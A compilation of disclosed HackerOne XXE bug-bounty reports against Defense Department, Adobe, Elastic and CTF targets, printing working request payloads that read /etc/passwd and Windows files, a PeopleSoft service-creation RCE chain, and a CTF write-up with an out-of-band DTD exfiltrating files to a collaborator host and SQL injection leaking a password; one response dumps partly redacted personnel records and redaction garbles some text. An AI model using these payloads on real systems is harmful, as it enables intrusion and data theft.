# XML External Entities (XXE)

_22 reports — High/Critical, disclosed_

### [XML E██████ternal Entity (XXE) Injection in ███](https://hackerone.com/reports/2564265)

- **Report ID:** `2564265`
- **Severity:** High
- **Weakness:** XML External Entities (XXE)
- **Program:** U.S. Dept Of Defense
- **Reporter:** @maskedpersian
- **Bounty:** - usd
- **Disclosed:** 2026-01-12T19:33:43.605Z
- **CVE(s):** CVE-2022-2414

**Vulnerability Information:**

Description
CVE-2022-2414 describes an XML E██████ternal Entity (XXE) injection vulnerability. XXE vulnerabilities occur when an application parses XML input that contains a reference to an e██████████ternal entity. When the XML parser is improperly configured to process e███████ternal entities, it can allow an attacker to███████
Read arbitrary files on the server.
Perform server-side request forgery (SSRF).
Conduct denial-of-service (DoS) attacks.
E█████████ecute remote code (in rare cases).

Host name█████ ██████████


POC████████
request█████████
```
POST /ca/rest/certrequests HTTP/1.1
Host███ ██████████
Sec-Ch-Ua███████ "Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"
Sec-Ch-Ua-Mobile██████████ ?0
Sec-Ch-Ua-Platform█████ "Windows"
Upgrade-Insecure-Requests███████ 1
User-Agent█████████ Mozilla/5.0 (Windows NT 10.0; Win64; ██████████64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept██████ te█████t/html,application/██████████html+████ml,application/████████ml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-e██████████change;v=b3;q=0.7
Sec-Fetch-Site████ same-origin
Sec-Fetch-Mode██████ navigate
Sec-Fetch-Dest███████ frame
Referer█████ █████████
Accept-Encoding████████ gzip, deflate
Accept-Language███████ en-US,en;q=0.9,fa;q=0.8
Priority██████ u=0, i
Connection█████ close
Content-Type██████ application/██████████ml
Content-Length████████ 194

<!--?████████ml version="2.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file████████///etc/passwd"> ]>
<CertEnrollmentRequest>
  <Attributes/>
  <ProfileID>&ent;</ProfileID>
</CertEnrollmentRequest>
```
responde████
```
HTTP/1.1 400 Bad Request
Date███████ ██████ █████ GMT
Server████ Apache
Content-Type███████ application/████ml
Content-Length█████ 4920
Connection██████████ close

<?████████ml version="1.0" encoding="UTF-8" standalone="yes"?><PKIE█████ception><Attributes/><ClassName>com.netscape.certsrv.base.BadRequestE███ception</ClassName><Code>400</Code><Message>Profile root███████████████0█████0█████████root███/root██████/bin/bash\nbin█████████████1██████1███████bin██████████/bin███████/sbin/nologin\ndaemon█████████2████████2████████daemon█████/sbin████████/sbin/nologin\nadm████████████████3█████████4███████adm█████/var/adm██████████/sbin/nologin\nmail█████████████████████████mail██████████/var/spool/mail████████/sbin/nologin\noperator███████████████11███████0████████operator████/root████/sbin/nologin\nnobody██████████████Nobody████/█████/sbin/nologin\navahi-autoipd█████████████████████████████Avahi IPv4LL Stack████████/var/lib/avahi-autoipd█████████/sbin/nologin\ndbus████████████System message bus█████████/██████/sbin/nologin\nabrt██████████████etc/abrt███/sbin/nologin\n█████████████████████9██████8██████████User for ██████████/█████/sbin/nologin\nunbound█████████████████998██████997████████Unbound DNS resolver█████████/etc/unbound███████/sbin/nologin\nlibstoragemgmt█████████997███████996██████████daemon account for libstoragemgmt█████████/var/run/lsm█████████/sbin/nologin\ntss█████████████████████████Account used by the trousers package to sandbo██████ the tcsd daemon███████/dev/null█████████/sbin/nologin\nntp████etc/ntp█████████/sbin/nologin\npostfi███████████████████var/spool/postfi████████████████/sbin/nologin\nsshd███████████74██████████74███Privilege-separated SSH████████/var/empty/sshd█████████/sbin/nologin\nchrony█████████████var/lib/chrony█████/sbin/nologin\nsystemd-bus-pro█████y████████████████████████systemd Bus Pro████y████████/█████████/sbin/nologin\nsystemd-network██████████████████████████████systemd Network Management█████████/████/sbin/nologin\nrpc███████████████Rpcbind Daemon████/var/lib/rpcbind██████████/sbin/nologin\npuppet████████████████████████████Puppet█████████/var/lib/puppet█████████/sbin/nologin\nnagios█████home/nagios████████/bin/bash\n█████████████home/████████████████/sbin/nologin\█████████home/██████████████/sbin/nologin\n████████████home/██████████/sbin/nologin\████home/███████████████/sbin/nologin\██████████████████████████home/███████████/sbin/nologin\██████████████home/█████████████████/sbin/nologin\nsssd███████████████████████████████990███████User for sssd████████/██████████/sbin/nologin\n█████████████████████PIZZULLO.JOSEPH.T.1264435060██████/home/████████████████/bin/bash\n█████████████████████home/█████████/sbin/nologin\nwstark█████home/wstark███████/sbin/nologin\newinters████████████████████/home/ewinters██████████/sbin/nologin\n███████████████████████/home/████████████/sbin/nologin\n████████████home/█████████████████/sbin/nologin\n███████████████████████████████ACAS Scanner██████/home/█████████/bin/bash\n███████████████████████████████████SANCHEZ.DIANA.L.1040930155█████████/home/███████████████████/bin/bash\nnfast████████████992███████989███████nfast driver service account████████/opt/nfast████/bin/bash\napache███████████████████████Apache██████/usr/share/httpd█████/sbin/nologin\nhsqldb████var/lib/hsqldb█████/sbin/nologin\ntomcat████████Apache Tomcat███/usr/share/tomcat██████████/bin/nologin\n████████████████████████████████████Certificate System█████/usr/share/███████/sbin/nologin\n█████████████████home/█████████████/sbin/nologin\n█████████████████████████home/████████████/sbin/nologin\n██████████-sw-█████████████████████████████████████████PKI user account for instance sw-ca-54████/home/███████-sw-ca-54████████/sbin/nologin\n█████-sw-ca-56█████████PKI user account for instance sw-ca-56████/home/█████████-sw-ca-56███████/sbin/nologin\n███-sw-██████████PKI user account for instance sw-ca-58█████/home/█████████-sw-ca-58██████████/sbin/nologin\n███████████████ALEXANDER.BRYAN.DOUGLAS.1165971600█████/home/██████████████████/bin/bash\n████████████████████████home/████████████████/sbin/nologin\n███████████████████████home/█████████████████/sbin/nologin\n████████████████home/████████████████/sbin/nologin\nrlamotte██████████home/rlamotte█████████/sbin/nologin\ngdunn███home/gdunn████████/sbin/nologin\n█████████████████home/█████████████/sbin/nologin\n█████████tech█████████home/███tech████/bin/bash\ninsights██████████████████████████Red Hat Insights█████████/var/lib/insights█████████/sbin/nologin\nafederico████home/afederico████/sbin/nologin\n███████████████home/██████████████/sbin/nologin\n██████████████████████████████/home/█████████████/sbin/nologin\n█████████-email-██████████'Certificate System'████████/usr/share/█████████████████/sbin/nologin\n█████████-id-███████████████'Certificate System'███████/usr/share/████████████████/sbin/nologin\n███-sw-█████████████'Certificate System'████████/usr/share/██████████/sbin/nologin\n█████████-sw-█████████████████'Certificate System'██████████/usr/share/████████████████/sbin/nologin\naes██████████████1043███1043███████Account used to host DTM OCSP certificates█████████/home/aes████████/bin/bash\nredhat██████████1044█████1044███████Account used to run AES webserver████/home/redhat████/bin/bash\nmagency█████████████████1045██████████1045█████████Service Account███/home/magency██████/bin/bash\n███████████████████████████████████████████/home/████████████████/sbin/nologin\n████████████████████████████████████/home/████████████/sbin/nologin\n██████████████████████████████████████████/home/███████████████/sbin/nologin\n████████████████████████████████████/home/█████████████/sbin/nologin\n█████████████████████████████████████████MULLIN.TIMOTHY.HUGH.1180218110█████/home/█████████████████/bin/bash\n████████████████████████████████████████████/home/███████/sbin/nologin\n██████████████████████████████████████NOVACK.BARRY.FRANCISE.1027795079██████████/home/█████████████/bin/bash\n███████████████████████████████████POWELL.JAY.A.1162634875█████/home/███████████/bin/bash\n█████████████████████████████████DOWNUM.ALEXANDER.JEFFERY.1257465523████████/home/█████████/bin/bash\nncsnmpd███████████1055████1055████nCipher crypto management█████████/opt/nfast█████/bin/bash\n█████████████████SUBIA.JOSE.A.1264627598█████/home/██████████████/bin/bash\n█████████████12345████████████████/home/██████████████/bin/false\n Not Found</Message></PKIE████████ception>
```

## Impact

E███████ploitation of this vulnerability can lead to████████
1-Confidentiality Breach██████████ Unauthorized access to sensitive information stored on the server.
2-Integrity Violation██████████ Potential manipulation or corruption of application data.
3-Availability Disruption██████ Possible denial-of-service conditions due to resource e█████████haustion or application crashes.
4-Remote Code E████ecution█████ In e██████████treme cases, e███████ecution of arbitrary commands on the server.

## System Host(s)
███████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
poc

## Suggested Mitigation/Remediation Actions

---

### [XML External Entity (XXE) Injection](https://hackerone.com/reports/2573567)

- **Report ID:** `2573567`
- **Severity:** High
- **Weakness:** XML External Entities (XXE)
- **Program:** U.S. Dept Of Defense
- **Reporter:** @maskedpersian
- **Bounty:** - usd
- **Disclosed:** 2024-07-19T14:41:33.156Z
- **CVE(s):** -

**Vulnerability Information:**

XML External Entity (XXE) injection vulnerability. XXE vulnerabilities occur when an application parses XML input that contains a reference to an external entity. When the XML parser is improperly configured to process external entities, it can allow an attacker to:
Read arbitrary files on the server.
Perform server-side request forgery (SSRF).
Conduct denial-of-service (DoS) attacks.
Execute remote code (in rare cases).
Host name: 	███████.mil

POC:
```
POST /ca/rest/certrequests HTTP/1.1
Host: ████████
Sec-Ch-Ua: "Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: frame
Referer: https://███████/ca/ee/ca/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,fa;q=0.8
Priority: u=0, i
Connection: close
Content-Type: application/xml
Content-Length: 194

<!--?xml version="2.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
<CertEnrollmentRequest>
  <Attributes/>
  <ProfileID>&ent;</ProfileID>
</CertEnrollmentRequest>
```

## Impact

Exploitation of this vulnerability can lead to:
1-Confidentiality Breach: Unauthorized access to sensitive information stored on the server.
2-Integrity Violation: Potential manipulation or corruption of application data.
3-Availability Disruption: Possible denial-of-service conditions due to resource exhaustion or application crashes.
4-Remote Code Execution: In extreme cases, execution of arbitrary commands on the server.

## System Host(s)
█████████.mil

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
```
POST /ca/rest/certrequests HTTP/1.1
Host: ██████
Sec-Ch-Ua: "Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: frame
Referer: https://██████████/ca/ee/ca/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,fa;q=0.8
Priority: u=0, i
Connection: close
Content-Type: application/xml
Content-Length: 194

<!--?xml version="2.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
<CertEnrollmentRequest>
  <Attributes/>
  <ProfileID>&ent;</ProfileID>
</CertEnrollmentRequest>
```

## Suggested Mitigation/Remediation Actions

---

### [XXE with RCE potential on the https://█████████ (CVE-2017-3548)](https://hackerone.com/reports/710654)

- **Report ID:** `710654`
- **Severity:** High
- **Weakness:** XML External Entities (XXE)
- **Program:** U.S. Dept Of Defense
- **Reporter:** @sp1d3rs
- **Bounty:** - usd
- **Disclosed:** 2024-07-19T14:31:50.271Z
- **CVE(s):** CVE-2017-3548

**Vulnerability Information:**

##Description
Hello. I was able to identify XXE on the https://███████
It is CVE in Oracle PeopleSoft (CVE-2017-3548)

##POC
I determined that instance is available on localhost port 80, so it's possible to access `/pspc/services/AdminService` via XXE:

```
POST /PSIGW/PeopleSoftServiceListeningConnector HTTP/1.1
Host: ████████
Content-Type: application/xml
Content-Length: 608

<!DOCTYPE a PUBLIC "-//B/A/EN" "http://localhost:80/pspc/services/AdminService?method=%21--%3E%3Cns1%3Adeployment+xmlns%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22+xmlns%3Ajava%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2Fproviders%2Fjava%22+xmlns%3Ans1%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%3E%3Cns1%3Aservice+name%3D%22h1testservice%22+provider%3D%22java%3ARPC%22%3E%3Cns1%3Aparameter+name%3D%22className%22+value%3D%22org.apache.pluto.portalImpl.Deploy%22%2F%3E%3Cns1%3Aparameter+name%3D%22allowedMethods%22+value%3D%22%2A%22%2F%3E%3C%2Fns1%3Aservice%3E%3C%2Fns1%3Adeployment">
```
where `h1testservice` is test service name I'm trying to create.

The result:
```
https://██████████/pspc/services/h1testservice
```
█████
I created new service on server.

It's possible to go further like other researcher did in the #227880 but I don't think that dropping shell is necessary (since it's already proved that we can create our Apache Axis service.

##Suggested fix
Patch Oracle PeopleSoft instance.

## Impact

Remote code execution, internal network access.

---

### [[HTA2] XXE on https://███ via SpellCheck Endpoint.](https://hackerone.com/reports/715949)

- **Report ID:** `715949`
- **Severity:** Critical
- **Weakness:** XML External Entities (XXE)
- **Program:** U.S. Dept Of Defense
- **Reporter:** @cdl
- **Bounty:** - usd
- **Disclosed:** 2023-05-15T15:13:37.449Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
There is a full read XXE vulnerability on 

## Steps To Reproduce:
  1. Log into `https://██████/` with the credentials `██████`
  2. Get your cookies and make the following HTTP Request with them

```
POST /Kview/CustomCodeBehind/Base/Utilities/RapidSpellHelpFile.aspx HTTP/1.1
Host: ███████
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/xml; charset=UTF-8
Content-Length: 1238
Connection: close
Referer: https://██████████/Kview/CustomCodeBehind/Base/PersonalHomepage/PersonalHomepageCalendarAddEvent.aspx?EventAction=AddEvent&EventDate=10/16/2019%2012:00:01%20AM
Cookie: [COOKIES]

<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY a SYSTEM "file:///c:\Windows\System32\Drivers\etc\hosts">]>
<r><resp>xml</resp><textToCheck>&a;</textToCheck><IAW/><UserDictionaryFile/><DictFile>d:\Meridian\MWRA\MG\11.1\KView\CustomCodeBehind\Base/en-US/DICT-EN-US-USEnglish.dict</DictFile><SuggestionsMethod>HASHING_SUGGESTIONS</SuggestionsMethod><LanguageParser>ENGLISH</LanguageParser><SeparateHyphenWords>False</SeparateHyphenWords><V2Parser>True</V2Parser><SSLFriendlyPage>/KView/CustomCodeBehind/WebResource.axd?d=zqrwmEhOpCtb9wLAM9uWrOzT_jYv5Un0ehQNczyIJSp-b9XbsULhZuZahCBf8Qk8anUm2kaMbXSDgD8qtwoc7T6Vnc9cbWVmTwIkPCbvIqLzTEGbDgA2oGtmx8o1&amp;t=633221022140000000</SSLFriendlyPage><SuggestSplitWords>True</SuggestSplitWords><IncludeUserDictionaryInSuggestions>True</IncludeUserDictionaryInSuggestions><WarnDuplicates>True</WarnDuplicates><IgnoreWordsWithDigits>True</IgnoreWordsWithDigits><CheckCompoundWords>False</CheckCompoundWords><LookIntoHyphenatedText>True</LookIntoHyphenatedText><GuiLanguage>ENGLISH</GuiLanguage><IgnoreXML>False</IgnoreXML><IgnoreCapitalizedWords>False</IgnoreCapitalizedWords><ConsiderationRange>-1</ConsiderationRange><IgnoreURLsAndEmailAddresses>True</IgnoreURLsAndEmailAddresses><AllowMixedCase>False</AllowMixedCase></r>
```

You will see the contents of `c:\Windows\System32\Drivers\etc\hosts` in the response:

██████████


We can also make HTTP requests to external and internal applications and read the full responses. We can also like steal NTLM domain hashes.

████

## Supporting Material/References:

  * https://techblog.mediaservice.net/2018/02/from-xml-external-entity-to-ntlm-domain-hashes/

## Impact

Critical, an attacker can read local files, make HTTP requests to internal applications and read the responses, steal NTLM hashes, and also completely deny service to the application.

Best,
Corben Leo (@cdl)

---

### [AEM forms XXE Vulnerability](https://hackerone.com/reports/1321070)

- **Report ID:** `1321070`
- **Severity:** Critical
- **Weakness:** XML External Entities (XXE)
- **Program:** Adobe
- **Reporter:** @ismailmuh
- **Bounty:** - usd
- **Disclosed:** 2022-01-13T18:38:45.245Z
- **CVE(s):** -

**Summary (team):**

AEM Forms Cloud Service offering, as well as version 6.5.10.0 (and below) are affected by an XML External Entity (XXE) injection vulnerability that could be abused by an attacker to achieve RCE. 

CVE: CVE-2021-40722
Ref: https://helpx.adobe.com/security/products/experience-manager/apsb21-103.html

We thank @ismailmuh for reporting this to Adobe!

---

### [HackerOne’s 100K CTF Writeup](https://hackerone.com/reports/1218708)

- **Report ID:** `1218708`
- **Severity:** Critical
- **Weakness:** XML External Entities (XXE)
- **Program:** h1-ctf
- **Reporter:** @rykkard
- **Bounty:** - usd
- **Disclosed:** 2021-06-21T21:51:02.798Z
- **CVE(s):** -

**Vulnerability Information:**

Greetings team
It has been a great challenge, thank you very much for the fun moments and also for the annoying ones :)

██████████

P.S. I will put my writeup in my next comment.

## Impact

---

---

### [CCC H1 June 2021 CTF Writeup](https://hackerone.com/reports/1217114)

- **Report ID:** `1217114`
- **Severity:** Critical
- **Weakness:** XML External Entities (XXE)
- **Program:** h1-ctf
- **Reporter:** @pmnh
- **Bounty:** - usd
- **Disclosed:** 2021-06-21T20:44:47.502Z
- **CVE(s):** -

**Vulnerability Information:**

## CTF Summary

This was my first H1 CTF and I was excited to work with several others to collaborate on the CTF and find the flag. I'll write up the solution process and vulnerabilities involved in the solution:

 * Knowledge (basic) of S3 operations
 * XML External Entities and Local File Exfiltration
 * SQL Injection (+source code review)
 * A very clever use of exfiltration using ICMP ping

The general theme of this CTF involved several out-of-band or blind attacks, which were not obvious on initial review.

## Phase 1: CCC web site and initial recon
The CTF site was located at https://ccc.h1ctf.com and contains a basic login page and registration feature. Registration is open to any user and requires no verification.

Upon registration, a user is redirected to the following page: https://ccc.h1ctf.com/u/sd2gah with an error message "Remote File list not found" and is presented with a unique hash key in the URL (e.g. `sd2gah`):
{F1325196}

We were initially stuck here, did some fuzzing etc., until an eagle-eyed member of our team spotted a clue in the Twitter feed for CCC Designs:
https://twitter.com/DesignsCcc/status/1398629597298806786/photo/1

We could see that the screen shot illustrates a file with the name `error_-_-_log.txt` located at the following URL: https://ccc.h1ctf.com/error_-_-_log.txt

The content of the file suggests S3 is involved:
```
File: https://████████.s3.eu-west-2.amazonaws.com/files.xml Not Found
File: https://█████.s3.eu-west-2.amazonaws.com/files.xml Not Found
File: https://██████.s3.eu-west-2.amazonaws.com/files.xml Not Found
File: https://████████.s3.eu-west-2.amazonaws.com/files.xml Not Found
File: https://████████.s3.eu-west-2.amazonaws.com/files.xml Not Found
```

We noticed that the suffix of the bucket name is a 6 character value, which looks suspiciously like the hash value we were assigned at registration time. We attempted to access each of these files and found one that seemed promising:

https://███.s3.eu-west-2.amazonaws.com/files.xml

```
<Message>The bucket you are attempting to access must be addressed using the specified endpoint. Please send all future requests to this endpoint.</Message>
<Endpoint>s3.amazonaws.com</Endpoint>
```

No problem, we'll use the URL rooted at `s3.amazonaws.com`: https://s3.amazonaws.com/███/files.xml

Here, we see the file suggests that XXE might be a valid attack vector:

```xml

<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "The espurr purrs"> %ext;
]>
<r></r>
```

We then created a `files.xml` in a new S3 bucket based on our hash, located here: https://h1-sd2gah.s3.eu-west-2.amazonaws.com/files.xml

After creating an empty XML file we confirmed the application is reading the file, as we see a different error message when reloading the page!

```html
<p><strong>Critical</strong> : File List Format Invalid</p>
```

So this is great because we demonstrated that the `files.xml` file is being pulled from the new S3 bucket that we set up.

## Phase 2: Build XXE payload to exfiltrate files on the server

This was a fun phase because I had never actually performed a 2-stage XXE required for local file inclusion. This was also a challenge because the XXE was blind (the XML document with entity replacement was not visible to the attacker), so we had to come up with an out-of-band method to exfiltrate the data.

We first set up a basic one-stage XXE to confirm that we had outbound connectivity, so we replaced `files.xml` with the following. Upon page reload, we validated that we got a ping on Collaborator:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "https://dct3rq1rn24apf28qeowjcmwpnvmjb.burpcollaborator.net/?">
    %xxe;
]>
<list></list>
```

Of course, in no circumstance did the page actually render the XML but this was not the point of this challenge. Now that we established outbound connectivity, we had to determine how to exfiltrate file content. After much trial and error we determined that the following payload could be used to exfiltrate files and local HTTP requests. First, we wrote an updated `files.xml` which references an external DTD. This is required to create more complex `ENTITY` mappings. So our `files.xml` now looks like this:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://h1-sd2gah.s3.eu-west-2.amazonaws.com/evil.dtd"> %xxe;]>
<list></list>
```

We also upload the referenced `evil.dtd` to our S3 bucket:

```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/nginx/sites-enabled/default">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://4din7yig3rkad847vsi5517v7mdc11.burpcollaborator.net/?x=%file;'>">
%eval;
%exfiltrate;
```

We can explain this a little bit. We define an entity `%file` containing the base 64-encoded contents of the file referenced in the `resource` parameter to the PHP filter. Without base64-encoding, this local file include will fail because it expects that the resulting entity contains valid DTD syntax. Then, the `%eval` entity is declared as an external `http` request to our burp collaborator endpoint. The `%eval` declaration will evaluate the first entity, and then the `%evaluate` declaration will evaluate the final payload.

This will result in a request to Burp Collaborator as follows:

```http
GET /?x=IyMKIyBZb3(long base64 string) HTTP/1.0
Host: 4din7yig3rkad847vsi5517v7mdc11.burpcollaborator.net
Connection: close
```

By decoding the contents of the `x` parameter, we can get the content of local files or local http endpoints!

Initially we thought the next attack vector was to try to access the AWS IMDSv1 endpoint located at `169.254.169.254` and available only from the local machine; however, we only had access to limited metadata and not enough that we could make AWS API requests or access the local machine further (for example through the SSM functionality to perform RCE).

We then reviewed he ccc-designs Twitter feed and noted this comment "Does anyone know if in nginx you can link a directory to a proxy_pass?" - which caused us to start looking at the nginx configuration available on the machine.

We found that the contents of the `/etc/nginx/sites-enabled/default` file indicated that a directory on the main site was reverse proxied to another local server:

```
#server {
#    server_name ccc.h1ctf.com;
#    root /var/www/app/public;
#    index index.php;
#    location / {
#            try_files $uri $uri/ /index.php?$query_string;
#    }
#     location /2b5d2b11513d2c9b {
#       proxy_pass http://127.0.0.1:8888;
#     }
```

We checked and validated that `https://ccc.h1ctf.com/2b5d2b11513d2c9b` contained a new application "net pinger". This brought us to the 3rd phase of this CTF!

Note that we tried various other recon techniques using the LFI including accessing local endpoints, trying to read source code, `/etc/passwd` etc., but these did not bear fruit, and in fact we found an `index.php` file containing a hash that rickrolled us :D

## Phase 3: Net Pinger
In the 3rd and final phase of this CTF, we are presented with a login screen to a "Net Pinger" application with no obvious way to log in!

We fuzzed the new directory using ffuf and found that a `.git` directory was present on the server:

```
scan@scanner-1:~$ ./ffuf -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36" -ac -w SecLists/Discovery/Web-Content/common.txt  -u https://ccc.h1ctf.com/2b5d2b11513d2c9b/FUZZ

(snip)

.git/config             [Status: 200, Size: 263, Words: 19, Lines: 12]
.git/HEAD               [Status: 200, Size: 23, Words: 2, Lines: 2]
.git                    [Status: 403, Size: 170, Words: 5, Lines: 7]
```

We acquired these files and found that there was a reference to a public repository on Github:

```
[remote "origin"]
	url = https://github.com/ccc-labs/pinger.git
```

Great! This repo contained the code for the whole application. After some review we found there is a publicly accessible endpoint `/api/ping` which is an unauthenticated endpoint meant to do the following:

  * Take an `id` GET parameter
  * Find a row in the `host` SQL table with the `id` column of this parameter
  * Send a `ping` to the host specified in this table row 

The code for this action is found here: https://github.com/ccc-labs/pinger/blob/8fce47791b92f183c0f1a7e033c87bab4881737d/_pingercode_/models/Ping.php#L10

We confirmed that the API can be invoked using the URL `https://ccc.h1ctf.com/2b5d2b11513d2c9b/api/ping?id=1`, although the results of the ping are not visible to the caller.

Upon code review we determined that the SQL code used to load the record from the database is vulnerable to SQL injection due to lack of prepared statements or parameter sanitization:

```python
        $sql = 'select * from host where id = '.$id.' LIMIT 1 ';
```

Unfortunately after some evaluation we determined that there is no visible error or output from the ping command, SQL syntax errors or execution errors are not reported. Furthermore, we cannot use the `sleep` or `benchmark` commands because they are blocked by a WAF, making typical blind time-based SQLi attacks infeasible.

We were stuck here for a bit and then decided to take a look at how the `ping` command was executed. The line of code executing the ping command looks like this:

```python
                    shell_exec('ping -s '.$packet_size.' -c 4 '.$ip.'  > /dev/null &');
```

The `$packet_size` variable is set from the `packet_size` column of the select statement, and the `$ip` variable is set from the `ip` column. By reviewing the DDL for the table located in the Github repository we determined that the column order was: `id, ip, packet_size`.

Initially we thought an approach where we could insert into the table could allow us to achieve RCE by inserting commands into the `ping` command line, unfortunately there was not any way to manipulate the contents of the table - *however* we had a hunch...

Although we couldn't verify that a `UNION` would work, we took a guess that it would. So we were looking for a payload that would UNION a 3-column result set, and some way to validate that we could receive an ICMP ping from this server.

Using our VPS with a public static IP address, we ran `tcpdump` to listen for ICMP traffic, after first confirming that ICMP rules were applied to firewalls and that we could receive ping requests. Running the following command allowed us to listen for inbound ping requests:

```
tcpdump ip proto \\icmp
```

Once we did this we issued a simple UNION to confirm that we could receive a ping from the server: `-1 UNION SELECT 4,'161.35.110.235',32 from user where id=1 limit 1 -- `, making the full query (where `my_ip` is the IP address on my VPS):

```
select * from host where id = -1 UNION SELECT 4,'my_ip',32 from user where id=1 limit 1 -- LIMIT 1`
```

This could be executed with the following URL:
`https://ccc.h1ctf.com/2b5d2b11513d2c9b/api/ping?id=-1%20UNION%20SELECT%204%2c'my_ip'%2c32%20from%20user%20where%20id%3d1%20limit%201%20--%20`

We received a ping on the ICMP port so this confirmed we were on the right track!
```
13:18:19.051334 IP ███████ > scanner-1: ICMP echo request, id 1, seq 50, length 40
13:18:19.051374 IP scanner-1 > █████: ICMP echo reply, id 1, seq 50, length 40
```

This confirmed that we could control the arguments to the `ping` command without being able to insert database data! Unfortunately upon further code review, filtering was in place to ensure these parameters were not injectable for RCE - packet length was restricted to an integer, and the IP parameter was validated as an IPv4 address - so no chance of RCE via ping.

So finally the question was, how can we exfiltrate database data? In a classic blind SQLi you can use some sort of canary with a boolean condition such as a sleep/wait or the return of a true/false value, unfortunately we had none of these. However, we had 2 variables to play with - IP address and packet size. We needed the IP address to remain constant so that we could receive the OOB ping (true/false). Initially we started treating this as a boolean attack, by using the fact that we received a ping as a "true" vale, and non-receipt of a ping as a "false" value.

However, this was very time consuming due to aggressive rate limiting on this endpoint. We then considered the _other_ parameter - packet size. Could we set the packet size to a known value, that we could use to exfiltrate data?

Turns out the answer is yes :) We were able to exfiltrate the admin password a character at a time, by translating the letter values to ASCII, and then using these ASCII values to set the packet size on the ping request. The following SQL, executed for every character in the `SUBSTRING` command, provided us with the ability to extract a single character at a time from the admin password, and set the packet size to the ASCII value of that character. The union parameter now looks like this:

```
-1 UNION SELECT 4,'my_ip',ascii(substring(password,1,1)) from user where id=1 -- 
```

We see that the packet size received by our `tcpdump` has changed:

```
13:28:36.258314 IP ec2-18-216-97-43.us-east-2.compute.amazonaws.com > scanner-1: ICMP echo request, id 306, seq 1, length 93
```

Each ICMP packet has a base size of 8 bytes, so we need to subtract 8 from the `length 93` to get a value of `85` or an ASCII value of `U`.

We repeated this query for every character of the password, incrementing the 2nd parameter to `substring` until we did not receive a ping, at which point we knew the SQL was throwing an error and we had read all the characters. This gave us the following mapping:

```
93 	--> 85	--> U
108 	--> 100	--> d
63 	--> 55	--> 7
65 	--> 57	--> 9
102 	--> 94	--> ^
57	--> 49	--> 1
80	--> 72	--> H
80	--> 72	--> H
82	--> 74	--> J
44	--> 36	--> $
95	--> 87	--> W
50	--> 42	--> *
81	--> 73	--> I
87	--> 79	--> O
106	--> 98	--> b
105	--> 97	--> a
83	--> 75	--> K
108	--> 100	--> d
89	--> 81	--> Q
111	--> 103	--> g
81	--> 73	--> I
```

... which gave us an admin password of `Ud79^1HHJ$W*IObaKdQgI`. We validated that this allowed us to access the admin panel and acquire the (only) flag.

Unfortunately we did not find a way to bypass the 1 request per minute rate limit :( so extracting this took 21 minutes of waiting :)

Thanks for the great CTF, this was my first H1 CTF and I participated with a great team!

## Impact

Through XXE, the attacker could read files, access internal endpoints, etc., though SQLi, the attacker could exfiltrate any data in the database.

---

### [XXE in Enterprise Search's App Search web crawler](https://hackerone.com/reports/1156748)

- **Report ID:** `1156748`
- **Severity:** Critical
- **Weakness:** XML External Entities (XXE)
- **Program:** Elastic
- **Reporter:** @dee-see
- **Bounty:** - usd
- **Disclosed:** 2021-04-29T15:05:10.100Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary

Hello team! The latest version of Enterprise Search (7.12.0) is vulnerable to XXE when [parsing sitemaps](https://www.elastic.co/guide/en/app-search/current/crawl-web-content.html#crawl-web-content-manage-sitemaps). Up to now I'm only able to read file that contain one line. I'm reporting now to avoid duplicates, but I'll keep working to find a way to extract entire files or HTTP request bodies.

## Description

